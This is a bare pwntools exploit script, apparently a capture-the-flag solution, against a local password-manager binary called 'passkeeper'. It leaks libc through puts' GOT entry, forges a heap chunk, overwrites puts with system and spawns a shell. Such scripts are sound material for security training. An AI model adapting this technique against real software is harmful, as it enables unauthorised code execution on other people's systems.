#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./passkeeper")
p = process("./passkeeper")
gdb.attach(p,"init-gef")
libc = ELF("libc.so.6")

def set_name(name,secret):
    p.sendafter("{?} Enter name: ",name)
    p.sendafter("{?} Enter secret: ",secret)

def malloc(password):
    p.sendlineafter("> ","1")
    p.sendlineafter("{?} Enter password: ",password)

def free(index):
    p.sendlineafter("> ","4")
    p.sendlineafter("{?} Enter password id: ",str(index))

def view(index):
    p.sendlineafter("> ","2")
    p.sendlineafter("{?} Enter password id: ",str(index))
    p.recvuntil("Value: ")
    return p.recvline()[:-1]

def change_secret(secret):
    p.sendlineafter("> ","7")
    p.sendlineafter("Enter new secret: ",secret)

def view_profile():
    p.sendlineafter("> ","6")
    p.recvuntil("You logined as ")
    leak = p.recvline()[:-1]
    return leak

set_name(b"/bin/sh\x00"+b'a'*40+p64(0x0)+p64(0x41),p64(elf.got.puts))

for i in range(16):
    malloc("a"*8)
leak = view(16)
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
libc.address = leak-libc.sym.puts
log.critical("Libc base: {}".format(hex(libc.address)))
system = libc.sym.system
change_secret(p64(0x404100))
free(16)
malloc(p64(system))
p.sendline("6")
p.interactive()